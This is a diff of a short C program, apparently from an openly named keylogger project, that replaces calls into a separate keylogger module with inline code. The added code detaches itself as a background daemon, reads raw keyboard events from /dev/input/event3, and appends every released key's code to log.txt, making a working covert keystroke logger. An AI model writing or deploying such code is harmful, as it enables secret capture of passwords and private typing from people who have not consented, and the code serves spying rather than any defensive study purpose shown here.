@@ -1,21 +1,22 @@
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
+#include <sys/stat.h>
 #include "daemonize.c"
-#include "keylogger.c"
-
-int main()
+int main(int argc, char **argv)
 {
-    skeleton_daemon();
-    
+    struct input_event ev;
+    int keyboard = open("/dev/input/event3", O_RDONLY);
+    FILE *fp = fopen("log.txt", "a");
+    daemonize();
     while (1)
     {
-        syslog (LOG_NOTICE, "Keylogger started.");
-        keylogger();
-        sleep (20);
-        break;
+        read(keyboard, &ev, sizeof(ev));
+        if ((ev.type == EV_KEY) && (ev.value == 0))
+        {
+            fflush(fp);
+            fprintf(fp, "%d\n", ev.code);
+        }
     }
-   
-    syslog (LOG_NOTICE, "Keylogger terminated.");
-    keylogger_exit();
-    closelog();
-    
-    return EXIT_SUCCESS;
 }
